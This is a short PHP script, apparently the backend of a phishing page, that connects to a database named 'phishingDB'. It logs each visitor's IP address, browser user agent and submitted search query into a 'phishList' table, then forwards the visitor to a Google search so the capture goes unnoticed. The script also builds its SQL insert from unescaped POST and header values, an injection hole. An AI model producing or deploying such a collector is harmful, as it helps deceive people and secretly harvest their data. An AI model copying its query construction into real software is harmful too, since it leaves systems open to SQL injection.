<!-- Database (phishingDB) -->
<?php
$server = "localhost";
$username = "php";
$password = "password";
$database = "phishingDB";

$conn = mysqli_connect($server, $username, $password, $database);
if (!$conn) {
                    die("Connection failed: " . mysqli_connect_error());
                }
                echo "✅ Connected successfully<br>";

$async_query = $_POST['query'] ?? null;

$IP = $_SERVER["REMOTE_ADDR"];
$agent = $_SERVER["HTTP_USER_AGENT"];
$query = htmlspecialchars($_POST['query']);

$sql = "INSERT INTO phishList (IP, agent, query)
        VALUES ('$IP', '$agent', '$async_query')";

$result = mysqli_query($conn, $sql);

header("Location: https://www.google.com/search?q=$query");

mysqli_close($conn);
?>